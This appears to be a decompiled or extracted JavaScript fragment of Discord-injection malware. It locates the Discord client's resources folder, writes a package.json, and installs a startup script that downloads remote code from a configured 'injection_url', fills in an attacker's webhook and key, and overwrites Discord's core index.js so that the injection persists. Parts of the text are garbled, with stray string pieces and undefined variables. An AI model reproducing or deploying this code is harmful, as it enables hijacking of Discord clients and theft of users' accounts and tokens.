const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})()
resourcePath = _tmp_8.resourcePath
resourcePath === undefined || app === undefined
const appPath = path.join(resourcePath, 'app')
const packageJson = path.join(appPath, 'package.json')
const resourceIndex = path.join(appPath, 'index.js')
const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar')
!fs.existsSync(appPath)
fs.existsSync(packageJson)
fs.existsSync(resourceIndex)
fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    )
packageJson
JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      )
const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`
"';
const bdPath = '"
"';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('"
config.webhook
config.webhook_protector_key
path.join(resourcePath, 'app.asar')
fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'))
